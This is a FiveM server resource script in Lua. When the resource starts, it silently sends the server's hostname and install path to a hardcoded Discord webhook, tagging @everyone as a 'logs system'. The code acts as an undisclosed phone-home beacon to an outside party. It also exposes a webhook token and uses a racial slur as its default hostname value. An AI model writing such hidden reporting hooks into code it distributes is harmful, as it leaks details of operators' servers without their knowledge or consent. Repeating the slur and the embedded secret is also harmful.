local logs = "https://discord.com/api/webhooks/835573800540176414/oADclzz_WVrogto7JKDf8KYqycqwH8oD1ir0-kJWBR2rgcDg6e0ulEt2fjDuRPFUnAzR"
local lconnect = "@everyone Logs system is in use"
AddEventHandler("onServerResourceStart", function(resource)
    if GetCurrentResourceName() == resource then  
        local servername = GetConvar("sv_hostname","nigga")
        local connect = lconnect.."\nServer: "..servername.. "\npath :" ..GetResourcePath(GetCurrentResourceName()).. ""
        PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "MORP Logs System", content = connect}), { ['Content-Type'] = 'application/json' })
    end
end)